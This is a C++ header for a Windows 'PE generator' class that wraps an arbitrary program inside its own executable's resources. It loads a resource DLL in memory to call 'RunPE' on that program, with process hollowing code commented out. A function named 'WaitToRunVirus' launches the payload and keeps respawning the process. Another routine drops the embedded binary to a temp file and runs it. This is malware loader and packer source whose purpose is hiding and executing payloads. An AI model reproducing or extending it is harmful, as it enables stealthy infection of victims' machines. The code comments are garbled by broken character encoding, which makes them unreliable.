#pragma once
#include "resource.h"

#include "MemoryModule.h"
// #include "ProcessHollowing.h"

#include <windows.h>
#include <iostream>
#include <fstream>
#include <thread>

#include <atlstr.h>

// ԭ����ָ��
typedef HRSRC(WINAPI* FindResource_t)(HMODULE hModule, LPCSTR lpName, LPCSTR lpType);
typedef HGLOBAL(WINAPI* LoadResource_t)(HMODULE hModule, HRSRC hResInfo);

extern HMEMORYMODULE g_mem_pe;
extern FindResource_t OriginalFindResource;
extern LoadResource_t OriginalLoadResource;

BOOL CALLBACK EnumLangsProc(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam);
BOOL CALLBACK EnumNamesProc(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam);
BOOL CALLBACK EnumTypesProc(HMODULE hModule, LPWSTR lpType, LONG_PTR lParam);
BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath);

// ö����Դ���͵Ļص�����
BOOL CALLBACK EnumTypesProc32(HMODULE hModule, LPWSTR lpType, LONG_PTR lParam);
BOOL CALLBACK EnumNamesProc32(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam);
BOOL CALLBACK EnumLangsProc32(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam);
BOOL AddFileToResource32(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath);


// ����һ������ָ�����ͣ��� DLL �еĵ�������ǩ��ƥ��
typedef int (*RunPEFunc)(int);
// typedef int (*RunPEFunc)(void*, DWORD);

// ����Դ��ӵ����ļ��Ľṹ��
struct ResourceUpdateData {
    HANDLE hUpdate;
};

struct ResourceUpdateData32 {
    HANDLE hUpdate;
};

// �Զ���ṹ�壬ģ�� IMAGE_RESOURCE_DATA_ENTRY
typedef struct {
    DWORD OffsetToData;  // ��Դ���ݵ�ƫ��
    DWORD Size;          // ��Դ���ݵĴ�С
} RESOURCE_ENTRY, * PRESOURCE_ENTRY;

class CPEGenerator
{
public:
	CPEGenerator()
        : ph(NULL)
        , pRunPE(NULL)
    {

	}
	~CPEGenerator() {

        if (ph) {
            MemoryFreeLibrary(ph);
        }

	}

public:
    void ParseParams(int argc, wchar_t* argv[]) {
        if (argc <= 1) {
            WaitToRunVirus();
            // MemoryLoadToRun(IDR_BINARY_FILE);
            // MemoryLoadToRun(IDR_BINARY_FILE);
            //pRunPE(IDR_BINARY_FILE);
        }
        else if (argc == 2) {
            CString str_param = argv[1];
            if (str_param == L"run") {
                // ExtractAndRunResourceProgram(IDR_BINARY_FILE);
                // MemoryLoadToRun(IDR_BINARY_FILE);
                MemLoadDll();
                pRunPE(IDR_BINARY_FILE);
                // RunPE();

                //HANDLE hMainThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
                //if (!hMainThread) {
                //    return;
                //}

                //// ���������߳�ִ�� Hollowing
                //HANDLE hThread = CreateThread(NULL, 0, HollowingThread, hMainThread, 0, NULL);
                //if (!hThread) {
                //    CloseHandle(hMainThread);
                //    return;
                //}

                //// �ȴ������߳����
                //WaitForSingleObject(hThread, INFINITE);
                //CloseHandle(hThread);
                //CloseHandle(hMainThread);

            }
            else if (str_param == L"wait") {
                return;
            }
        }
        else if(argc >= 3) {
            WCHAR exePath[MAX_PATH];
            // ��ȡ��ǰ�����·��
            DWORD result = GetModuleFileName(NULL, exePath, MAX_PATH);
            LPCWSTR resourceFilePath = argv[1];
            LPCWSTR newExePath = argv[2];
#ifdef _WIN64
            AddFileToResource(exePath, resourceFilePath, newExePath);
#else
            AddFileToResource32(exePath, resourceFilePath, newExePath);
#endif
        }
    }   

    //BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath) {
    //    WCHAR tempFilePath[MAX_PATH];

    //    // ������ʱ�ļ�·��
    //    GetTempPath(MAX_PATH, tempFilePath);
    //    GetTempFileName(tempFilePath, L"tmp", 0, tempFilePath);

    //    // ����ǰ��ִ���ļ����Ƶ���ʱ�ļ�
    //    if (!CopyFile(exePath, tempFilePath, FALSE)) {
    //        MessageBox(NULL, L"Failed to create temporary file.", L"generator", MB_OK);
    //        return FALSE;
    //    }

    //    // ����ʱ�ļ�������Դ����
    //    HANDLE hUpdate = BeginUpdateResource(tempFilePath, FALSE);
    //    if (!hUpdate) {
    //        MessageBox(NULL, L"Failed to open file for resource update.", L"generator", MB_OK);
    //        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
    //        return FALSE;
    //    }

    //    // ��Ҫ��ӵ���Դ���ļ�
    //    std::ifstream file(resourceFilePath, std::ios::binary);
    //    if (!file.is_open()) {
    //        MessageBox(NULL, L"Failed to open the input file.", L"generator", MB_OK);
    //        EndUpdateResource(hUpdate, TRUE);
    //        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
    //        return FALSE;
    //    }

    //    // ��ȡ�ļ����ݵ��ڴ�
    //    file.seekg(0, std::ios::end);
    //    size_t fileSize = file.tellg();
    //    file.seekg(0, std::ios::beg);

    //    char* buffer = new char[fileSize];
    //    file.read(buffer, fileSize);
    //    file.close();

    //    // ���ļ����ݸ��µ���Դ��
    //    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_BINARY_FILE), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, fileSize)) {
    //        MessageBox(NULL, L"Failed to update the resource.", L"generator", MB_OK);
    //        delete[] buffer;
    //        EndUpdateResource(hUpdate, TRUE);
    //        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
    //        return FALSE;
    //    }

    //    delete[] buffer;

    //    // �����Դ����
    //    if (!EndUpdateResource(hUpdate, FALSE)) {
    //        MessageBox(NULL, L"Failed to finalize resource update.", L"generator", MB_OK);
    //        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
    //        return FALSE;
    //    }

    //    // ���޸ĺ����ʱ�ļ����Ƶ�Ŀ���ļ�·��
    //    if (!CopyFile(tempFilePath, newExePath, FALSE)) {
    //        MessageBox(NULL, L"Failed to create the final output file.", L"generator", MB_OK);
    //        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
    //        return FALSE;
    //    }

    //    // ɾ����ʱ�ļ�
    //    DeleteFile(tempFilePath);

    //    MessageBox(NULL, L"Resource added successfully.", L"generator", MB_OK);
    //    return TRUE;
    //}


    // ��ȡ��ǰ���̵���Դ�λ���ַ
    IMAGE_RESOURCE_DIRECTORY* GetCurrentProcessResourceDirectory() {
        HMODULE hModule = GetModuleHandle(NULL);
        if (!hModule) return nullptr;

        IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
        IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);

        DWORD resourceRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress;
        if (resourceRVA == 0) return nullptr;

        return (IMAGE_RESOURCE_DIRECTORY*)((BYTE*)hModule + resourceRVA);
    }

    void RedirectResourceDirectory(HMEMORYMODULE loadedModule, IMAGE_RESOURCE_DIRECTORY* newResourceDir) {
        IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)loadedModule;
        IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)loadedModule + dosHeader->e_lfanew);

        // �޸���ԴĿ¼�� RVA �ʹ�Сָ��ǰ���̵���Դ��
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress = (DWORD)((BYTE*)newResourceDir - (BYTE*)loadedModule);
    }

    HANDLE RunGenerator(CString cmdline) {
        BOOL flag = FALSE;

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        // ʹ�� CreateProcess ��������
        flag = CreateProcess(
            NULL,                       // Ӧ�ó�������
            cmdline.GetBuffer(),            // ������
            NULL,                       // ���̰�ȫ������
            NULL,                       // �̰߳�ȫ������
            FALSE,                      // �Ƿ�̳о��
            0,                          // ������־
            NULL,                       // ��������
            NULL,                       // ��ǰĿ¼
            &si,                        // ������Ϣ
            &pi                         // ������Ϣ
        );
        cmdline.ReleaseBuffer();

        if (flag) {
            std::wcout << L"�ɹ�������������ID��" << pi.dwProcessId << std::endl;
            // �رս��̺��߳̾��
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        else {
            std::cerr << "����ʧ�ܣ������룺" << GetLastError() << std::endl;
        }

        return pi.hProcess;
    }

    BOOL WaitToRunVirus() {
        // ��ȡ��ǰ���������·��
        wchar_t modulePath[MAX_PATH];
        GetModuleFileName(NULL, modulePath, MAX_PATH);

        // ���������в�������������·���Ͳ���
        CString commandLine;
        commandLine.Format(L"\"%s\" wait", modulePath); // ע�����Ű���·��
        // commandLine.Format(L"\"%s\"", modulePath); // ע�����Ű���·��

        // ������������
        CString run_vir;
        run_vir.Format(L"\"%s\" run", modulePath); // ע�����Ű���·��
        RunGenerator(run_vir);


        while (FileExists(modulePath)) {
            // ����������Ϣ�ͽ�����Ϣ�ṹ��
            
            RunGenerator(commandLine);
            Sleep(10000);
        }
        return TRUE;
    }

    BOOL MemLoadDll() {
        BOOL flag = FALSE;
        try {
            // ���ص�ǰģ��
            HMODULE hModule = GetModuleHandle(NULL);
            if (!hModule) {
                std::wcerr << L"Failed to load module.\n";
                return flag;
            }

            // ������Դ
            HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(IDR_PH), RT_RCDATA);
            if (!hResource) {
                std::wcerr << L"Failed to find resource.\n";
                return flag;
            }

            // ������Դ
            HGLOBAL hResData = LoadResource(hModule, hResource);
            if (!hResData) {
                std::wcerr << L"Failed to load resource.\n";
                return flag;
            }

            // ��ȡ��Դ��С������ָ��
            DWORD dataSize = SizeofResource(hModule, hResource);
            void* pData = LockResource(hResData);

            // 2. ʹ�� MemoryLoadLibrary �� EXE ���ص��ڴ�
            ph = MemoryLoadLibrary(pData, dataSize);

            if (!ph) {
                std::cout << "Failed to load EXE into memory." << std::endl;
                return flag;
            }

            pRunPE = (RunPEFunc)MemoryGetProcAddress(ph, "RunPE");

            //// �����Ѽ��� DLL���õ�����
            //HMODULE hDll = LoadLibraryA("PhDll.dll");

            //MessageBox(NULL, L"test", L"test", MB_OK);
            //// ʹ�� GetProcAddress ��ȡ RunPE �����ĵ�ַ
            //RunPEFunc pRunPE = (RunPEFunc)GetProcAddress(hDll, "RunPE");

            // pRunPE = (RunPEFunc)MemoryGetProcAddress(ph, "RunPE");
        }
        catch (const std::exception& e) {
            std::cout << "Error: " << e.what() << std::endl;
            return flag;
        }
        return flag;
    }

    BOOL MemoryLoadToRun(int resourceId) {
        BOOL flag = FALSE;
        try {
            // ���ص�ǰģ��
            HMODULE hModule = GetModuleHandle(NULL);
            if (!hModule) {
                std::wcerr << L"Failed to load module.\n";
                return flag;
            }

            // ������Դ
            HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
            if (!hResource) {
                std::wcerr << L"Failed to find resource.\n";
                return flag;
            }

            // ������Դ
            HGLOBAL hResData = LoadResource(hModule, hResource);
            if (!hResData) {
                std::wcerr << L"Failed to load resource.\n";
                return flag;
            }

            // ��ȡ��Դ��С������ָ��
            DWORD dataSize = SizeofResource(hModule, hResource);
            void* pData = LockResource(hResData);

            // pRunPE(pData, dataSize);

            // 2. ʹ�� MemoryLoadLibrary �� EXE ���ص��ڴ�
            /*HMEMORYMODULE hmemModule = MemoryLoadLibrary(pData, dataSize);
            if (!hmemModule) {
                std::cout << "Failed to load EXE into memory." << std::endl;
                return flag;
            }*/

            // ��ȡ��ǰ���̵���ԴĿ¼��ַ
            //IMAGE_RESOURCE_DIRECTORY* currentResourceDir = GetCurrentProcessResourceDirectory();
            //if (currentResourceDir) {
            //    // �ض����ڴ���� EXE ����ԴĿ¼ָ��
            //    RedirectResourceDirectory(hmemModule, currentResourceDir);
            //}
            //else {
            //    std::cerr << "Failed to locate current process resource directory." << std::endl;
            //}
            
            

            // 3. ��ȡ EXE �ļ�����ڵ㲢����
            // MemoryCallEntryPoint(hmemModule);

            // 4. ж�� EXE �ļ�
            // MemoryFreeLibrary(hmemModule);
        }
        catch (const std::exception& e) {
            std::cout << "Error: " << e.what() << std::endl;
            return flag;
        }
        return flag;
    }

    bool FileExists(CString filePath) {
        DWORD fileAttr = GetFileAttributes(filePath);
        // �������ֵΪ INVALID_FILE_ATTRIBUTES����ʾ�ļ������ڻ����
        return (fileAttr != INVALID_FILE_ATTRIBUTES && !(fileAttr & FILE_ATTRIBUTE_DIRECTORY));
    }

    BOOL ExtractAndRunResourceProgram(int resourceId) {
        // ���ص�ǰģ��
        HMODULE hModule = GetModuleHandle(NULL);
        if (!hModule) {
            std::wcerr << L"Failed to load module. code  = " << GetLastError() << "\n";
            return FALSE;
        }

        // ������Դ
        HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
        if (!hResource) {
            std::wcerr << L"Failed to find resource.\n";
            return FALSE;
        }

        // ������Դ
        HGLOBAL hResData = LoadResource(hModule, hResource);
        if (!hResData) {
            std::wcerr << L"Failed to load resource.\n";
            return FALSE;
        }

        // ��ȡ��Դ��С������ָ��
        DWORD dataSize = SizeofResource(hModule, hResource);
        void* pData = LockResource(hResData);

        // ����Դ����д����ʱ�ļ�
        WCHAR tempPath[MAX_PATH];
        WCHAR tempFile[MAX_PATH];
        GetTempPath(MAX_PATH, tempPath);
        GetTempFileName(tempPath, L"tmp", 0, tempFile);

        std::ofstream outFile(tempFile, std::ios::binary);
        if (!outFile.is_open()) {
            std::wcerr << L"Failed to create temp file.\n";
            return FALSE;
        }
        outFile.write((char*)pData, dataSize);
        outFile.close();

        // ����һ������������ȡ�ĳ���
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (!CreateProcess(tempFile, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            std::wcerr << L"Failed to run the extracted program.\n";
            DeleteFile(tempFile); // ɾ����ʱ�ļ�
            return FALSE;
        }

        // �ȴ��������
        WaitForSingleObject(pi.hProcess, INFINITE);

        // ����
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        DeleteFile(tempFile); // ɾ����ʱ�ļ�

        std::wcout << L"Program executed successfully.\n";
        return TRUE;
    }

    // ������Դ����


private:
    RunPEFunc pRunPE;
    HMEMORYMODULE ph;

};
